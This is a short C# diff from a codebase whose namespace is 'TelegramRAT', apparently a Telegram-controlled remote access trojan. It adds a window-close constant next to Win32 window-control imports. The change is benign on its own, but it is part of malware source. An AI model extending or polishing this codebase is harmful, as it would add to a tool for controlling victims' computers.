@@ -89,6 +89,7 @@ namespace TelegramRAT
         public const int SC_MINIMIZE = 0xF020;
         public const int SC_MAXIMIZE = 0xF030;
         public const int SC_RESTORE = 0xF120;
+        public const int SC_CLOSE = 0xF060;
 
         [DllImport(u32, EntryPoint = "CloseWindow")]
         public static extern bool MinimizeWindow(IntPtr handle);
@@ -105,6 +106,5 @@ namespace TelegramRAT
         [DllImport(u32, EntryPoint = "PostMessageA")]
         public static extern bool PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);
         
-
     }
 }
